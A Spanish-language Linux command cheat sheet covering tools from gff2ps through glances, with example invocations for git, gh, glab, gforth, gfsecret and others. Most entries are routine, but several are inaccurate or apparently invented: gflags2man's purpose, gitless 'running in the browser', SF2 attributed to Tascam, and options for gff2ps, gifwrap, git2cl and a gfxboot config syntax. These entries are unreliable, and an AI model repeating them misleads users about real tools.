Programa para biólogos computacionales que trabajan con datos genómicos para convertir registros en formato GFF [General Feature Format] en gráficos unidimensionales de alta calidad en PostScript. El GFF es un formato estándar utilizado para representar información sobre genes y características genéticas en secuencias de ADN.
$ gff2ps input.gff > output.ps (convierte el archivo input.gff al formato PostScript y lo guarda como output.ps)
$ gff2ps -b input.gff > gene_bar_chart.ps (generar un gráfico de barras para representar genes)
$ gff2ps -c input.gff > gene_circular_chart.ps (crear un diagrama circulr de genes)
$ gff2ps -s "gene_color=red;font_size=12" input.gff > styled_genes.ps (personaliza el color y el tamaño de la fuente para los genes en el gráfico)
$ gff2ps -r input.gff > gene_summary.ps (crea un resumen de genes agrupados por región)


gflags2man
Convierte páginas man en archivos de texto en /tmp.
$ gflags2man ls (Creará el archivo ls.1 en /tmp)


gfmd
[GFarm Metadata server Daemon]. Servidor de metadatos como nombres, ubicaciones, permisos, etc del sistema de archivos gfarm utilizado principalmente en entornos de cómputo de alto rendimiento [HPC] y clústeres. El sistema de archivos Gfarm está diseñado para convertir ordenadores portátiles en nodos de una red de almacenamiento distribuido, implementando la arquitectura Grid Datafarm para la computación intensiva en datos a gran escala global.
# gfmd (inicia el servidor de metadatos. Por defecto, lee su configuración de /etc/gfarm2.conf)
# gfmd -L - (ejecutar en modo foreground y enviar los logs a la salida estándar en lugar de un archivo de log)
$ ps aux | grep gfmd (verificar si está corriendo)


gforth
Es una implementación del lenguaje Forth desarrollada por el proyecto GNU. Forth es un lenguaje de programación basado en pilas [stack], interactivo y extensible, que se usa en sistemas embebidos, aplicaciones científicas y como herramienta educativa.
$ gforth (entra en el modo interactivo)
Algunos ejemplos de uso de una pila de operaciones:
> 5 3 + . (suma los dígitos e imprime el resultado: "8 ok")
> 10 4 * . (multiplica imprime resultado)
> 7 2 - . (resta e imprime resultado)
> 8 3 / . (Divide e imprime 2, porque usa división entera)
> : cuadrado dup * ; (define una palabra "cuadrado" [función] que eleva al cuadrado el número en la pila)
> 4 cuadrado . (imprime 16)
1.-
Estructuras de control
> : es-positivo? ( n -- )
>   0 > if ." Es positivo" else ." No es positivo" then ;
> 7 es-positivo? (imprime "Es positivo")
> -2 es-positivo? (imprime "No es positivo")
2.-
Bucles
> : contar-10 ( -- )
>   10 0 do i . loop ; (imprime números del 0 al 9)
> contar-10
3.-
Ejecutar un intérprete
$ nano factorial.fs
       : factorial ( n -- n! )
          dup 1 > if
           dup 1 - recurse *
         else
           drop 1
         then ;
$ gforth factorial.fs (cargar el programa)
> 5 factorial . (imprime 120)


gfsd
Es el daemon del sistema de archivos Gfarm, que gestiona operaciones de almacenamiento distribuido en nodos de una red. Su función principal es convertir PCs en nodos de almacenamiento para computación intensiva de datos a gran escala
$ gfsd -h nodo1.example.com -r /var/gfarm/spool (define el host como nodo1.example.com y usa /var/gfarm/spool como directorio de almacenamiento)
$ gfsd -d -L debug (muestra logs detallados en la consola)
$ gfservice start-gfsd gfsd1 (iniciar gfsd en un nodo remoto)
$ gfservice stop-gfsd gfsd1 (detener el servicio)


gfsecret
Herramientas para facilitar el intercambio de secretos, un método criptográfico que permite dividir un secreto (como un archivo o una clave) en múltiples partes o "recursos compartidos" de manera que solo un número mínimo de estas partes es necesario para reconstruir el secreto original. El esquema de Shamir, propuesto en 1979, divide un secreto en "n" partes [recursos compartidos] de modo que se necesitan al menos "k" partes [umbral] para reconstruirlo. Utiliza interpolación polinómica sobre campos finitos para garantizar seguridad teórica de la información: con menos de "k" partes, es matemáticamente imposible obtener información sobre el secreto. Cuenta con tres herramientas principales: gfsec-split, que divide un archivo en varios recursos compartidos, y gfsec-use, que reconstruye el archivo original a partir de algunos de los recursos compartidosy y gfsec-split-gpg, un script auxiliar que facilita dividir claves privadas de GnuPG.
1.-
Supongamos que se tiene un archivo sensible /home/USER/secreto.txt y se quiere dividir en 3 recursos compartidos, de los cuales se necesitan al menos 2 para reconstruirlo.
$ gfsec-split -n 2 -s file:///home/alice/.local/share/gfsecret/secreto.share1 -s label://USBSTICK/secreto.share2 -s mtp://RF2GB6X704P/Documents/secreto.share3 /home/USER/secreto.txt
Explicación:
        -n 2: Establece el umbral en 2, se necesitan al menos 2 recursos compartidos para reconstruir el secreto.
        -s <URI>: Especifica las ubicaciones de los recursos compartidos:
           - Uno en el sistema de archivos local [file://].
           - Otro en un dispositivo USB con etiqueta USBSTICK [label://].
           - Otro en un dispositivo MTP con número de serie RF2GB6X704P [mtp://].
        /home/USER/secreto.txt: El archivo a dividir.
Resultado:
        - gfsec-split genera 3 recursos compartidos y los almacena en las ubicaciones especificadas.
        - El archivo original /home/USER/secreto.txt se elimina a menos que se use la opción "-k" para conservarlo.
        - Se crea un archivo de configuración en "$XDG_CONFIG_HOME/gfsecret/secreto.conf" o en una ubicación especificada con -c, que contiene:
          OUTFILE=/home/alice/secreto.txt
          MINSHARES=2
          URI=file:///home/USER/.local/share/gfsecret/secreto.share1.024
          URI=label://USBSTICK/secreto.share2.070 [Dispositivo externo identificado por su etiqueta]
          URI=mtp://RF2GB6X704P/Documents/secreto.share3.139 [Dispositivo MTP identificado por su número de serie]
Para reconstruir el archivo "/home/USER/secreto.txt usando los recursos compartidos:
$ gfsec-use -c $XDG_CONFIG_HOME/gfsecret/secreto.conf
Explicación:
        - -c: Especifica el archivo de configuración generado por gfsec-split.
        - gfsec-use busca los recursos compartidos en las URIs listadas en el archivo de configuración.
        - Si al menos 2 recursos compartidos están disponibles, por ejemplo, el archivo local y el USB, reconstruye el archivo /home/USER/secreto.txt.
        - Una vez reconstruido, gfsec-use abre un nuevo shell donde puedes usar el archivo. Cuando el shell termina, el archivo reconstruido se elimina automáticamente.
Nota.- Si se divide un secreto en 5 partes (n=5) con un umbral de 3 (k=3), cualquier combinación de 3 o más partes puede reconstruir el secreto, pero 2 o menos no revelan nada. Salida de ejmplo si faltan recursos:
       Found share data in file:///home/USER/.local/share/gfsecret/secreto.share1.024
       gfsec-use: Cannot reconstitute the secret: Not enough shares available
Salida de ejemplo con éxito:
       Found share data in file:///home/USER/.local/share/gfsecret/secreto.share1.024
       Found share data in label://USBSTICK/secreto.share2.070
       gfsec>
En este caso, el archivo se reconstruye, y se puede trabajar con él en el shell. Al salir con "exit", el archivo se borra.
2.-
Ejemplo de dividir una clave privada de GnuPG
Supongamos que USER quiere dividir su clave privada en 3 recursos compartidos, con un umbral de 2.
$ gfsec-split-gpg USER file:///home/USER/.local/share/gfsecret/mykey.share1 label://USBSTICK/mykey.share2 mtp://RF2GB6X704P/Documents/mykey.share3
Explicación:
        - USER: El identificador de la clave GnuPG de USER [puede ser el ID de la clave o el correo asociado].
        - Se crean 3 recursos compartidos en las ubicaciones especificadas.
        - Se genera un archivo de configuración en $XDG_CONFIG_HOME/gfsecret/mykey.conf.
        - El umbral por defecto es 2 si no se especifica con la opción -n.
Reconstrucción:
$ gfsec-use -c $XDG_CONFIG_HOME/gfsecret/mykey.conf
Esto reconstruye la clave privada temporalmente, permitiendo usarla en un shell seguro.
Nota.- gfsec-split elimina el archivo original y gfsec-use borra el archivo reconstruido tras usarlo.


gftp
Cliente para  la tranferencia de archivos. Logs y configuración en ~/.gftp/gftp.log y ~/.gftprc
$ gftp ssh2://USER:PASS@HOST:22/home/USER_REMOTO (Abre la interfaz gráfica)


gftp-text
Cliente ftp. Precisa que el servidor tenga corriendo ftp [vsftpd... ]
$ gftp-text ftp://usuario@host (Pedirá la contraseña y entrará en el promt del servidor)
Nota.- Una vez en el promt:
ftp> help (Para saber los comando disponibles)
ftp> quit (Para salir)


gfxboot
Herramienta para personalizar la apariencia como imágenes de fondo, fuentes personalizadas, barras de progreso, etc de los menús de arranque más populares como GRUB, LILO y Syslinux, haciéndolos más atractivos visualmente.
1.-
Ejemplo de un tema con una imagen de fondo y texto básico.
Supongamos una imagen llamada fondo.png y se quiere mostrar un menú simple con texto blanco sobre ese fondo.
# nano tema.cfg
       background fondo.png
       color white
       font default
       menu {
         item "Iniciar Linux" --command="linux /boot/vmlinuz root=/dev/sda1"
         item "Opciones Avanzadas" --submenu=advanced
       }
       submenu advanced {
         item "Modo Recuperación" --command="linux /boot/vmlinuz root=/dev/sda1 single"
         item "Volver" --command=main
       }
"background fondo.png" indica la imagen de fondo, "color white" establece el color del texto en blanco, "font default" usa la fuente predeterminad, la sección "menu" define las opciones principales del menú y la sección "submenu advanced" define un submenú.
$ gfxboot tema.cfg (simularía cómo se vería el menú de arranque con el fondo blanco y las opciones de texto)
2.-
Ejemplo con un tema con una fuente personalizada [Ubuntu-Bold.ttf] y una barra de progreso.
# nano tema.cfg
       background azul_gradiente.png
       color negro
       font Ubuntu-Bold.ttf 16  # Especifica la fuente y el tamaño
       menu {
         item "Iniciar Ubuntu" --command="linux /boot/vmlinuz root=/dev/sda1 quiet splash"
       }
       progressbar {
         x 50
         y 400
         width 400
         height 20
         color verde
         background gris
       }
"font Ubuntu-Bold.ttf 16" especifica la fuente y su tamaño y la sección "progressbar" define la posición, dimensiones y colores de la barra de progreso.
$ gfxboot tema.cfg (probar el tema)
Notaa.- No todos los cargadores de arranque admiten todas las características de gfxboot de la misma manera. Es importante consultar la documentación del cargador de arranque específico para conocer las opciones compatibles.


gh
GitHub CLI, la herramienta oficial de línea de comandos de GitHub.
$ gh auth login (autenticar gh y Git con GitHub)
$ gh repo list (listar repositorios)
$ gh repo create nombre-repo --private (crear un nuevo repositorio)
$ gh repo clone repo (clonar un repositorio)
$ gh pr status (verificar estado de los cambios)
$ gh contribution (verificar contribuciones)
$ gh release create v1.0.0 --title "Version 1.0.0" --notes "Nueva versión" (crear una release)


ghostscript
Intérprete del lenguaje PostScript® y de archivos PDF. Incluye las aplicaciones: dvipdf, eps2eps, gs, gsbj, gsdj, gsdj500, gslj, gslp, gsnd, pdf2dsc, pdf2ps, pf2afm, pfbtopfa, pphs, printafm, ps2ascii, ps2epsi, ps2pdf, ps2pdf12, ps2pdf13, ps2pdf14, ps2pdfwr, ps2ps, ps2ps2, ps2txt y update-gsfontmap


ghostty
Emulador de terminal moderno. Configuración en ~/.config/ghostty/config
$ ghostty +list-themes (ver los temas disponibles. El escogido se anota en el archivo de configuración [theme = Dark Pastel]
$ ghostty +list-fonts (listado de fuentes)
$ ghostty +edit-config (editar la configuración)
$ ghostty +validate-config (validar la configuración)
$ ghostty +show-config (ver la configuración actual)
$ ghostty +list-actions (ver las acciones)
$ ghostty +list-keybinds (ver los atajos de teclado)
Una muestra del archivo de configuración:
$ nano ~/.config/ghostty/config
       font-family = "Monospace"
       font-size = 14
       theme = Adventure
       copy-on-select = clipboard
       window-decoration = none
       shell-integration = bash
       window-height = 19
       window-width = 105


gifwrap
Mostrar archivo GIF en la terminal convirtiendo los fotogramas del GIF en caracteres ASCII o utilizando colores de terminal.
$ gifwrap animacion.gif (visualizar un GIF en la terminal)
$ gifwrap -w 80 animacion.gif (ajustar el ancho de visualización, en columnas de terminal)
$ gifwrap -f 5 animacion.gif (muestra el 5º fotograma)
$ gifwrap -l 3 animacion.gif (repite el GIF 3 veces)
$ gifwrap -d 200 animacion.gif (200 milisegundos entre fotogramas)


gigtools
Herramientas para archivos Gigasampler [formato propietario de Tascam/Nemesys], DLS [DownLoadable Sounds] y SF2 [formato propietario de Tascam/Nemesys] para la gestión de archivos RAW .dls, .gig y .sf2. Estos archivos se utilizan habitualmente en samplers de forma de onda de audio. Incluye las herramientas akaidump, akaiextract, dlsdump, gig2mono, gig2stereo, gigdump, gigextract, gigmerge, korg2gig, korgdump, rifftree, sf2dump y sf2extract.
$ akaidump archivo.AKAI (analiza y muestra información de archivos de muestras de Akai)
$ gigdump archivo.gig (muestra la estructura de un archivo .gig, instrumentos, regiones, capas, muestras...)
$ gigextract archivo.gig directorio_salida/ (extrae muestras individuales, normalmente en WAV desde un archivo .gig)
$ akaiextract archivo.AKAI directorio_salida/ (extrae muestras de archivos de formato Akai a archivos WAV)
$ dlsdump banco_sonidos.dls (muestra la estructura de un archivo DLS, instrumentos, regiones, ondas, etc)
$ gig2mono archivo.gig archivo_salida.gig (convierte un archivo .gig estéreo en uno mono dividiendo sus canales)
$ gig2stereo archivo_izquierdo.gig archivo_derecho.gig archivo_estereo.gig (convierte dos archivos .gig mono, izquierdo y derecho, en un archivo estéreo)
$ gigmerge salida_combinada.gig archivo1.gig archivo2.gig (combina múltiples archivos .gig en uno solo)
$ korg2gig archivo_korg directorio_salida/ (convierte muestras de formato Korg a .gig)
$ korgdump archivo_korg (muestra la estructura interna de un archivo de muestras de Korg)
$ rifftree archivo.wav (visualiza la estructura RIFF de cualquier archivo basado en el formato RIFF como WAV, DLS, etc.)
$ sf2dump sonido.sf2 (muestra la estructura de un archivo .sf2)
$ sf2extract sonido.sf2 directorio_salida/ (extrae muestras desde un archivo .sf2)


gimp
Procesador de imagenes.
Carpetas donde colocar herramientas suplementarias:
Brochas (.gbr)	/usr/share/gimp/2.0/brushes/
Patrones (.pat)     /usr/share/gimp/2.0/patterns
Paletas (.gpl)	/usr/share/gimp/2.0/palettes
Degradados(.ggr)/usr/share/gimp/2.0/gradients


ginkgo
Es un marco de pruebas de Golang de estilo BDD [Behavior-Driven Development], diseñado para generar, ejecutar, filtrar y perfilar suites de pruebas de Ginkgo. Se complementa mejor con la biblioteca de comparadores Gomega, pero está diseñado para ser independiente de los comparadores.
$ ginkgo (ejecutar todas las pruebas en el directorio actual)
$ ginkgo my_test_file.go (ejecutar pruebas en un archivo específico)
$ ginkgo bootstrap students (creará un archivo de prueba llamado "students_suite_test.go" dentro del directorio "students")
$ ginkgo -r (ejecutar todas las suites de pruebas bajo el directorio actual de manera recursiva)
$ ginkgo watch (monitorear cambios en los archivos y ejecutar las pruebas automáticamente cuando se detecten cambios)
$ ginkgo watch -r (detecta todas las suites de pruebas bajo el directorio actual de manera recursiva)
$ ginkgo --junit-report=report.xml (generar reporte en formato XML)
$ ginkgo -focus="@focus" (ejecutar solo las pruebas que coincidan con una etiqueta específica)
$ ginkgo -p --keep-going (ejecutar pruebas en paralelo y continuar ejecutando las pruebas incluso si algunas fallan)


ginstall-info
Comparte las mismas opciones, funcionalidad y sintaxis que install-info [ver]


gis-all
Es un metapaquete [paquete especial que no contiene software en sí, sino que depende de otros paquetes] que forma parte de Debian Gis Pure Blend, una variante diseñada para usuarios que trabajan con datos geográficos, teledetección y observación de la Tierra e instala de manera automática un amplio conjunto de programas y bibliotecas orientados al trabajo con Sistemas de Información Geográfica [Geographical Information System - GIS]. gis-all instalará programas como QGIS, GRASS GIS, GDAL, PROJ, y otros relacionados con la gestión, análisis y visualización de información geográfica.


git
[git-core]. Manual completo en español: <http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/es/book.html#_hosting_git_gratuito>
Software de control de versiones. Una vez registrados en Github [<http://github.com>], crear un nuevo repositorio con el nombre escogido y github nos facilitará los datos de acceso [Al estilo: https://github.com/templix/tractatus.git].
Crear el repositorio local de un proyecto alojado en github:
	$ mkdir tractatus (Crear el directorio local)
	$ cd tractatus (Entrar en él)
	$ git init (Inicializar git)
	$ git config --global user.name "nombre_usuario" (Entrar datos del usuario)
	$ git config --global user.mail mail@direccion.com   (Entrar mail)
	$ mv /home/usuario/tractatus.txt . (Mover el archivo al repositorio)
	$ git add tractatus.txt (Añadir el fichero a git)
	$ git commit -a -m 'Inicio del proyecto' (Realizar el primer commit [comentario con los cambios en el proyecto])
	$ git remote add origin https://github.com/templix/tractatus.git (Decirle a nuestra copia local el repositorio remoto donde se alojará)
	$ git push origin master (Enviar los cambios al servidor remoto)
Otros comandos:
$ git clone git@github.com:templix/tractatus.git (Clonar un repositorio por protocolo git)
$ git clone https://github.com/templix/tractatus.git (Clonar un repositorio por protocolo https)
$ git clone ssh://usuario@host.com/home/templix/repositorio repositorio (Clonar por ssh un directorio remoto en local)
$ git config -l (Comprobar todos los parámetros configurados)
$ git config user.email (comrpobar el mail del usuario)
$ git config remote.origin.url (Ver cual es el repositorio remoto)
$ git log (Ver historial de commits)
$ git log --oneline (ver el historial y cada entrada en una linea)
$ git log --pretty=oneline (Mostrar listado de push a uno por linea pero de forma completa)
$ git status (Comprobar si se han efectuado cambios)
$ git config --global credential.helper cache (guarda la contraseña en caché durante 15 min)
$ git config --global credential.helper 'cache --timeout=3600' (guarda la contraseña durante una hora)
$ git rm archivo (Eliminar archivo)
$ git fetch origin (este comando junto con el siguiente elimina todos los cambios locales y pone la versión del servidor)
$ git reset --hard origin/master
$ git diff --color-words archivo1 archivo2  (Mostrar las diferencias en color)
$ git instaweb --httpd=webrick (Abre el proyecto con navegador en localhost:1234)
$ git instaweb --httpd=webrick --stop (Cierra la visualización del proyecto con el navegador)
$ git config --help (Mostrar ayuda de un comando)
$ git commit --amend (editar el último commit para modificarlo)
1.-
Indicar a git archivos o directorios que quedemos excluir del control de versiones.
$ touch .gitignore (Crear el fichero en el directorio raiz del proyecto)
Con el contenido que queremos excluir [Algunos ejemplos]:
	*~
	tmp/*
	*.so
	*.zip
	Thumbs.db
Si el archivo .gitignore lo colocamos en el directorio $HOME afectará a todos los proyectos de git. Para ello lanzar:
$ git config --global core.excludesfile ~/.gitignore
2.-
Descartar modificaciones.
Si una vez realizadas modificaciones en un archivo, antes de lanzar el commit, queremos verlas y descartarlas:
$ git status
$ git diff
$ git checkout -- archivo
3.-
Imprimir todos los repositorios git de un usuario
	$ curl -s https://api.github.com/users/USERNAME/repos?per_page=1000 |grep git_url |awk '{print $2}'| sed 's/"\(.*\)",/\1/'
4.-
Cuando se formatea el disco y se instala nuevamente la distro y git produce un error porqué los datos del usuario y la máquina desde la que se comunicaba han variado respecto de los que constaban:
$ git clone git@github.com:tem... (clonar)
$ git config --global --edit
$ git commit --amend --reset-author
5.-
Normalmente los datos del usuario se guardan en ~/.gitconfig con lo que pueden visualizarse con:
$ cat .gitconfig


git2cl
Herramienta diseñada específicamente para convertir automáticamente los registros de cambios de Git a formatos compatibles con otros sistemas de control de versiones, como CVS [Concurrent Versions System]
$ git2cl --cvs <commit_hash>  commit.cvs (convierte el registro de Git especificado al formato CVS y lo guarda en un archivo llamado commit.cvs)
$ git2cl --cvs $(git log --format=%H) | sed 's/^/Commit:/' (convierte todos los commits desde el último commit hasta el primero, formateando cada uno como si fuera un commit individual en CVS)
$ git2cl --cvs $(git rev-list HEAD~5..HEAD) > range.cvs (convierte los últimos 5 commits a formato CVS y los guarda en un archivo llamado range.cvs)
$ git2cl --cvs abc123 > specific_commit.cvs (conversión de un commit específico. "abc123" es el hash de un commit específico que se quiere convertir)


git-doc
Documentación en inglés de git. Acceder via navegador a:
	file:///usr/share/doc/git-doc/gittutorial.html


git-shell
Shell de inicio de sesión git pero restringido solo para acceso SSH. Permite la ejecución solo de los comandos Git pull/push, además el administrador puede incluir otros comandos que han de detallarse en un subdirectorio llamado git-shell-commands en el directorio del usuario.


gita
Es una herramienta para gestionar múltiples repositorios Git de manera simultánea, mostrando su estado, rama, modificación, etc. Si varios repositorios están relacionados, Gita también permite ver su estado conjunto. Sus caracteristicas principales es que permite una visualización del estado de múltiples repositorios Git en una sola vista y que permite operaciones simultáneas como pull, push, fetch, etc., en varios repositorios.
$ gita add /ruta/al/repo1 /ruta/al/repo2 (añadir repositorios para que gita pueda gestionarlos)
$ gita ls (listar repositorios gestionados)
$ gita fetch (hace git fetch en todos los repositorios)
$ gita pull (hace git pull en todos en todos los repositorios)
$ gita push (hace git push en todos los repositorios)
$ gita pull repo1 (hace pull solo de repo1)
$ gita group add frontend repo1 repo2 (crear el grupo "frontend" con los repositorios especificados)
$ gita frontend status (ver estado de los repositorios del grupo "frontend")
$ gita rename repo1 nuevo-nombre (renombrar un repositorios)
$ gita rm repo2 (elimina repo2 del seguimiento. No borra los archivos)


gitbatch
Gestionar repositorios Git en un solo lugar
$ gitbatch (en el directorio con varios subdirectorios git, los muestra todos en una interfaz de consola)


gitbrute
Modifica la confirmación principal en un repositorio Git, modificando la hora de confirmación y la hora de autor para que el hash de la confirmación
Modifica un par de marcas de tiempo, de autor y confirmador, para que el hash de la confirmación de Git resultante comience con el prefijo indicado. Esta técnica se basa en la naturaleza del algoritmo SHA-1 utilizado por Git para generar los identificadores de las confirmaciones, donde pequeñas modificaciones en los metadatos pueden resultar en hashes completamente diferentes.
Nota.- La búsqueda de un hash con un prefijo específico puede ser computacionalmente costosa. La duración del proceso aumenta exponencialmente con la longitud del prefijo deseado.
$ gitbrute -cpus 64 -prefix 8e1dcfa696e42 (nivel de paralelismo; el predeterminado es el número de procesadores en línea al inicio y hash que se buscará)
$ gitbrute -force true (si la confirmación actual ya coincide con el prefijo, se reemplazará por otra)
Manipular los hashes de las confirmaciones puede generar confusión o desconfianza en entornos colaborativos. Es recomendable utilizar gitbrute únicamente con fines educativos o en proyectos personales donde se comprenda completamente el impacto de estas modificaciones.


gitinspector
Herramienta de análisis estadístico para repositorios Git que genera informes detallados sobre contribuciones, actividad y métricas de desarrollo en un proyecto.
$ gitinspector /ruta/al/repositorio (resumen de contribuciones por autor, incluyendo commits y cambios en líneas)
$ gitinspector -H /ruta/al/repositorio > reporte.html (genera un informe visual en HTML)
$ gitinspector --since="2023-01-01" --until="2023-12-31" /ruta/al/repositorio (analiza solo actividad del año 2023)
$ gitinspector -x "*.md" /ruta/al/repositorio (excluye archivos Markdown del análisis)
$ gitinspector -T /ruta/al/repositorio (muestra en qué horas hubo más actividad)


gitit
es un software de wiki que permite crear y mantener una wiki personal o colaborativa utilizando un sistema de control de versiones como Git o Darcs. Las páginas del wiki se almacenan como archivos de texto plano, lo que permite editarlas tanto a través de una interfaz web interactiva que gitit proporciona o directamente con herramientas como git, esto lo hace ideal para documentación técnica, notas personales, wikis colaborativos, etc. Soporta Markdown extendido, LaTeX, reStructuredText, HTML, etc y las páginas se pueden clonar, modificar, hacer commit y push como en cualquier repositorio Git.
$ gitit (lanza el servidor web en, por defecto, el puerto 5001. Acceder http://localhost:5001)
Cuando se lanza gitit por primera vez, se crea un directorio como este:
       ├── static/ (archivos estáticos como CSS, JS, imágenes)
       ├── templates/ (plantillas para la interfaz web)
       ├── wikidata/ (páginas del wiki)
       │   ├── Front Page.md
       │   ├── OtraPágina.md
       │   └── ...
       └── gitit.conf (configuración del wiki para cambiar puerto, nombre del wiki, permitir o no registros anónimos...)
$ gitit -p 8080 (personalizar el puerto)
El directorio wikidata/ se puede tratar como un repositorio Git:
$ git clone ssh://user@servidor.com/path/to/wiki wikidata (clonar el wiki desde un servidor remoto)
$ cd wikidata
$ git init (si no está inicializado)
$ git add "NuevaPágina.md"
$ git commit -m "Añadida nueva página"
$ git push
Nota.- Por defecto gitit no tiene autenticación. Para hacerlo más seguro se debería ejecutar detrás de un servidor como nginx o Apache con autenticación HTTP o usar un proxy inverso con HTTPS.


gitlab-cli
Herramienta para interactuar con la API del servidor de GitLab v4. El ejecutable se llama python-gitlab.
Configurar credenciales creando el archivo:
$ nano ~/.python-gitlab.cfg
       [global]
        default = gitlab.com
        ssl_verify = true
        timeout = 5
       [gitlab.com]
        url = https://gitlab.com
        private_token = el_token_personal
        api_version = 4
$ python-gitlab --help (ayuda general con todos los argumentos de la aplicación)
$ python-gitlab project -h (ver ayuda específica de un comando)
$ python-gitlab current-user get (información del usuario actual)
$ python-gitlab project list (listar proyectos)
$ python-gitlab group list (listar grupos)
$ python-gitlab project get --id=username/project-name (información de un proyecto específico)
$ python-gitlab project-issue list --project-id=username/project-name (listar los issues de un proyecto)
$ python-gitlab project-issue create --project-id=username/project-name --title="Nuevo issue" --description="Descripción del issue" (crear un nuevo issue)
$ python-gitlab project-access-request list --project-id=username/project-name (trabajar con solicitudes de acceso a proyectos)
$ python-gitlab event list (listar eventos)
$ python-gitlab project-variable list --project-id=username/project-name (gestionar variables de CI)
$ python-gitlab project create --name="Nuevo Proyecto" --description="Descripción del proyecto" (crear un nuevo proyecto)


gitlab-rulez
Herramienta que calcula y aplica cambios a la configuración de los proyectos en una instancia de GitLab según un conjunto de reglas YAML.
$ gitlab-rulez --gitlab-url https://gitlab.com --token <TU_TOKEN> --rules rules.yml (URL de la instancia de GitLab, token de acceso y ruta al archivo que contiene las reglas)


gitless
Es un sistema de control de versiones experimental basado en Git que se ejecuta completamente en el navegador ideal para proyectos pequeños o colaboraciones informales.
$ gitless init (iniciar un nuevo repositorio)
$ gitless commit -m "Mensaje del commit" (hacer un commit)   ```
$ gitless status (verificar el estado)
$ gitless log (ver la historia de commits)


gitlint
Herramienta escrita en Python que revisa los mensajes de confirmación [commit messages] de Git para asegurar que cumplen con una guía de estilo predefinida. Su objetivo es mejorar la claridad, concisión y utilidad de los mensajes de commit.
$ gitlint (analiza el mensaje del último commit en el repositorio actual)
$ gitlint --commit f3fb2205faf56b (revisar un commit específico por su hash)
$ gitlint install-hook (instala gitlint como hook en .git/hooks/commit-msg, para que se ejecute automáticamente en cada commit)
$ gitlint -c title-max-length.line-length=60 (establece la longitud máxima de la línea de asunto a 60 caracteres para esa ejecución. Por defecto 72)


gitmagic
Guía sobre el sistema de control de versiones Git, más fácil de entender que el manual de usuario oficial. En el navegador entrar en file:///usr/share/doc/gitmagic/gitmagic.html


gitpkg
Herramienta diseñada para facilitar el mantenimiento de paquetes Debian en repositorios Git. Proporciona automatización y herramientas para exportar paquetes fuente Debian desde revisiones específicas de Git.
$ gitpkg <branch> (en un repositorio Git con una sola rama especificada, se exportará dicha rama)
$ gitpkg <branch1> <branch2> (con dos ramas especificadas, la primera rama se exportará como el origen completo desempaquetado, mientras que la segunda rama se exportará para el orig.tar.gz2)
$ gitpkg --deb-dir=/ruta/personalizada <branch> (sobrescribir el directorio de destino predeterminado para los paquetes exportados)


gitsome
Herramienta de línea de comandos que combina funcionalidades de git con integración directa a GitHub y un entorno de shell interactivo con características avanzadas como: Autocompletado inteligente, sugerencias automáticas, historial de comandos, ayuda contextual, comandos directos de GitHub como crear issues, ver notificaciones, etc. Ver git y gh.
$ gitsome (abrirá una shell interactiva [IPython con mejoras], y dentro de ella se podrá usar tanto comandos de Git normales como comandos especiales de GitHub)
> xonfig wizard (inicia el asistente de configuración para crear ~/.xonshrc)
> xonfig tutorial (abre en el navegador un tutorial)


gitweb
Sistema de control de versiones de repositorios Git locales no en plataformas externas como GitHub.
# nano /etc/gitweb.conf
Y que la variable $projectroot apunte al directorio donde esté el repositorio git
      $projectroot = "/var/www/git";
Reiniciar Apache para aplicar los cambios:
# systemctl restart apache2
Y con el navegador acceder al repositorio: http://localhost/gitweb
Nota.- Si Apache2 está instalado, la interfaz web se habilita automáticamente en http://localhost/gitweb en caso de que no lo haga, entrar en el directorio del proyecto git y lanzar:
$ git instaweb
Y se abrirá directamente en una pestaña del navegador.


gksu
[gksudo]. Proporciona permisos para que un usuario autorizado pueda ejecutar cualquier programa, script o aplicación como usuario root. El nombre puede variar según distro o escritorio: kdesu en kde, beesu en Fedora...
$ gksu nautilus
$ gksudo nano /etc/resolv.conf


glab
herramienta CLI de GitLab de código abierto.
$ glab auth login (autenticar la aplicación y pedirá la URL de tu instancia de GitLab y token de acceso personal)
$ glab project list (lista de los proyectos a los que se tiene acceso)
$ glab project --namespace grupo_linux (ver proyectos dentro del grupo especificado)
$ glab project --mine (ver solo los proyectos del usuario)
$ glab project create nuevo-proyecto --description "Mi nuevo proyecto" --visibility private (creará un nuevo proyecto llamado "nuevo-proyecto" con la descripción proporcionada y lo establecerá como privado)
$ glab project view <nombre_del_proyecto> (información detallada sobre el proyecto)
$ glab project view ID_del_proyecto (lo mismo)
$ glab issue list <nombre_del_proyecto> (mostrará las issues abiertas en el proyecto especificado)
$ glab issue list <nombre_del_proyecto> --state=closed (mostrar las cerradas)
$ glab issue list <nombre_del_proyecto> --label=etiqueta (ver las que contengan determinada etiqueta)
$ glab issue list <nombre_del_proyecto> --author=juan (ver las de determinado autor)
$ glab issue create -t "Título de la nueva issue" -d "Descripción detallada de la issue" -p <nombre_del_proyecto> (creará una nueva issue con el título, descripción y proyecto especificado)
$ glab issue comment <número_de_issue> -m "Este es mi comentario" -p <nombre_del_proyecto> (añadir un comentario a una issue)
$ glab mr view <número_de_mr> -p <nombre_del_proyecto> (ver detalles de una merge request)
$ glab mr comment <número_de_mr> -m "Este es mi comentario" -p <nombre_del_proyecto> (añadir un comentario a una merge request)
$ glab pipeline list <nombre_del_proyecto> (listar las últimas pipelines de un proyecto)
$ glab pipeline view <ID_de_pipeline> -p <nombre_del_proyecto> (ver los detalles de una pipeline específica)
$ glab snippet list (listar snippets)
$ glab snippet create -t "Título del snippet" -f <ruta_al_archivo> --visibility private (crear un nuevo snippet)
Nota.- Aunque es mantenido por la comunidad de GitLab, no es una herramienta oficial de GitLab. Esto significa que la compatibilidad con futuras versiones de la API de GitLab podría depender de las actualizaciones de la comunidad.


glances
Monitorizar la actividad del sistema en local y modo cliente-servidor.
$ glances (Monitoreo local)
Modo cliente-servidor:
$ glances -s (En el servidor)
$ glances -t 3 -c 192.168.1.10 (En el cliente y actualizando el registro cada 3 segundos [por defecto cada segundo])
Teclas de control:
	h (Oculta / muestra la ayuda)
	a (Muestra los procesos de forma autormatica)
	c (Los muestra por consumo de CPU)
	d (habilitar/deshabilitar estadísticas I/O en disco)
	f (habilita/deshabilita las estadísticas del sistema de archivos)
	l (Oculta / muestra logs)
	m (Muestra los procesos por consumo de  memoria)
	n (Oculta / muestra el estado de los interfaces de red)
	p (Muestra los procesos por orden alfabético)
	w (Elimina los WARNING finalizados del archivo log)
	1 (intercambia entre las estadisticas globales de CPU y las estadisticas particulares por cada CORE)
	q (Salir)
Código de los colores:
	verde (correcto)
	azul (cuidado)
	magenta (Alerta)
	rojo (crítico)


glimpse
